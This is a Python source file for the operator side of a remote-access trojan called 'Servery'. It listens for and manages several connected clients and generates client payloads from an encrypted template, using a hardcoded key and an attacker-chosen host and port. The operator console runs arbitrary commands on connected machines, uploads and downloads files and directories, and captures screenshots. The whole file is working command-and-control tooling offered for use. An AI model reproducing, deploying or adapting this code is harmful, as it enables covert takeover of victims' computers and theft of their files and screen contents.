from __future__ import print_function
from time import sleep
from socket import socket, error
from shutil import make_archive
import os
from cryptography.fernet import Fernet
from threading import Thread


os.system("cls")
all_connections = []
all_addresses = []
all_responces = []
found = []
status_servery = True


# Function used for adding header to data which tells
# that what is length of comming data
# format == [length of data under 10] + command
# It means you can send 9999999999 bytes or 9.9 GB of data
# For large data you can change size in my case it is 10 (DEFAULT)
# If you change size then don't forget to change this size in server side script
# And also don't forget to change in "recvall()" function
def add_header(data):
	data = "{:<10}".format(len(data)) + data
	return data


# Function used for receiving all comming data using header
# Seted data_part receiving bytes upto 10 bytes (DEFAULT)
# so header can completely receive in my case it is "1024" bytes
def recvall(conn):
	new_data = True
	data = ""
	while True:
		data_part = conn.recv(1024)
		if new_data:
			data_len = int(data_part[:10])
			data_part = data_part[10:]
			new_data = False
		data += data_part
		if len(data) == data_len:
			break
	return data


# This function will bind and listen for connections
def bind_socket(host, port):
	global s
	s = socket()
	s.bind((host, port))
	s.listen(5)
	print("Listening ...... on ", end="")
	print((host, port))
	print("Servery($) ", end="")
	accept_conn()


# This function will accept connections
def accept_conn():
	while True:
		conn, address = s.accept()
		s.setblocking(1)  # prevents timeout
		all_connections.append(conn)
		all_addresses.append(address)
		if status_servery:
			name = "Servery($) "
			print("Found " + str(address) + "\n" + name, end="")
		else:
			found.append("Found " + str(address) + "\n")
		all_responces.append(recvall(conn))


# To get list and delete unconnected clients from list of connections
def list_conn():
	run = True
	while run:
		if not all_addresses:
			break
		for i, address in enumerate(all_addresses):
			try:
				all_connections[i].send(add_header("a"))
				recvall(all_connections[i])
				run = False
			except error:
				del all_connections[i]
				del all_addresses[i]
				del all_responces[i]
				run = True
				break

def create_client():
	key = "8bH85AgvjWkKw4IlhI8Va3qprLXec2dipzS_9loLOp8="
	cipher_suite = Fernet(key)
	while True:
		host_name = raw_input("Enter IP, Host or Domain Name to which client will connect: ")
		if not host_name:
			print("Invalid Input")
			continue
		break
	while True:
		port_num = raw_input("Enter PORT to which client will connect:                    ")
		if not port_num.isdigit():
			print("Invalid Input")
			continue
		break
	while True:
		file_name = raw_input("Enter File Name:                                            ")
		if not host_name:
			print("Invalid Input")
			continue
		file_name += ".py"
		break
	client = open("client.enc", 'r').read()
	client = cipher_suite.decrypt(client).format('"' + host_name + '"', port_num)
	open(file_name, "w").write(client)
	print("Your client File Has Been Released as " + file_name)


# servery is CLI (Command Line Interface) to controlling multi-connections
def servery():
	status_listen = False
	while True:
		cmd = raw_input("Servery($) ")
		if cmd == "list":
			list_conn()
			for i, address in enumerate(all_addresses):
				print(str(i+1), address)
		elif ("use " in cmd) and (cmd[4:].isdigit()) and (0 < int(cmd[4:]) <= len(all_addresses)):
			cmd = int(cmd[4:]) - 1
			print(all_responces[cmd], end="")
			connection(all_connections[cmd])
		elif "listen" in cmd:
			cmd = cmd[7:].split(":")
			if len(cmd) == 2 and cmd[1].isdigit():
				cmd[1] = int(cmd[1])
				if not status_listen:
					Thread(target=bind_socket, args=cmd).start()
					status_listen = True
				else:
					print("I'm already listening on other host and port")
		elif cmd == "client":
			create_client()
		elif "close" in cmd:
			if len(cmd) == 5:
				try:
					for i in all_connections:
						i.send(add_header("close()"))
				except error:
					pass
				result = "Connections has been closed"
			else:
				cmd = cmd[6:]
				if cmd.isdigit():
					cmd = int(cmd)
					if ((len(all_connections)) >= cmd) and (cmd > 0):
						try:
							all_connections[cmd-1].send(add_header("close()"))
						except error:
							print("Connection was already closed")
							continue
						result = "Connection has been closed"
					else:
						result = "Invalid close"
				else:
					result = "Invalid close"
			print(result)
		elif ("cls" in cmd) or ("clear" in cmd):
			os.system("cls")
		elif cmd == "help":
			print(open("servery.help", 'r').read())
		else:
			os.system(cmd)


# Just for printing
def input_check():
	print("Check your input")


# This is main funcion used for sending and displaying received data
def connection(conn):
	def leave_close():
		global status_servery
		status_servery = True
		for i in found:
			print(i)
		del found[:]
	global status_servery
	status_servery = False
	x = 0
	while True:
		cmd = (raw_input("> "))
		if cmd[:9] == "uploaddir":
			dir_name = cmd[11:].split(",,")
			if len(dir_name) == 2:
				try:
					print("Making archive of directory " + dir_name[0])
					archive = make_archive(dir_name[0], 'zip', dir_name[0])
					data = open(archive, "rb").read()
					os.remove(archive)
					print("Sending")
					file_data = (cmd[:9] + dir_name[1] + "||=shail=||" + data)
					file_data = add_header(file_data)
					conn.send(file_data)
					print("File sended and wating for response ...")
					response = recvall(conn)
					print(response, end="")
				except (IOError, WindowsError):
					print("Not Any File Found in server")
			else:
				input_check()
		elif cmd[:6] == "upload":
			file = cmd[8:].split(",,")
			if len(file) == 2:
				try:
					print("Reading file " + file[0])
					with open(file[0], "rb") as f:
						data = f.read()
					print("Reading file complete")
					file_data = (cmd[:6] + file[1] + "||=shail=||" + data)
					print("sending")
					file_data = add_header(file_data)
					conn.send(file_data)
					print("File sended and wating for response ...")
					response = recvall(conn)
					print(response, end="")
				except IOError:
					print("Not Any File Found in server")
			else:
				input_check()
		elif cmd[:11] == "downloaddir":
			dir_name = cmd[13:].split(",,")
			if len(dir_name) == 2:
				file_data = add_header(cmd[:11] + dir_name[0])
				conn.send(file_data)
				print("Request sended ...")
				data = recvall(conn)
				data = data.split("||=shail=||")
				if data[0] == "not found":
					print("Not Any File Found ...")
				else:
					try:
						open((dir_name[1] + "_downloaded.zip"), "wb").write(data[0])
						print("Directory has been received")
					except IOError:
						print("No such file or directory in server")
				print(data[1], end="")
			else:
				input_check()
		elif cmd[:8] == "download":
			file = cmd[10:].split(",,")
			if len(file) == 2:
				file_data = (cmd[:8] + file[0])
				file_data = add_header(file_data)
				conn.send(file_data)
				data = recvall(conn)
				data = data.split("||=shail=||")
				if data[0] == "not found":
					print("Not Any File Found ...")
				else:
					try:
						with open(file[1], "wb") as f:
							f.write(data[0])
							print("File Has Been Received")
					except IOError:
						print("No such file or directory ...")
				print(data[1], end="")
			else:
				input_check()
		elif cmd[:10] == "screenshot":
			cmd = cmd.split(",,")
			if len(cmd) == 2:
				cmd, shot_path = cmd
				shot_path = shot_path + ".png"
				cmd = add_header(cmd)
				conn.send(cmd)
				response = recvall(conn)
				response = response
				shot, cwd = response.split("||=shail=||")
				with open(shot_path, "wb") as f:
					f.write(shot)
					x += 1
				print("Screenshot Saved In " + shot_path)
				print(cwd, end="")
			else:
				input_check()
		elif cmd == "close":
			conn.send(add_header("close()"))
			conn.close()
			print("Connection closed with it")
			leave_close()
			break
		elif cmd == "leave":
			leave_close()
			break
		elif len(cmd) > 0:
			cmd = add_header(cmd)
			conn.send(cmd)
			response = recvall(conn)
			print(response, end="")


# This is used to start listening for conections again and again if any error occured
while True:
	try:
		servery()
	except error as msg:
		sleep(1)
		print(msg)
		print("Retrying ...")
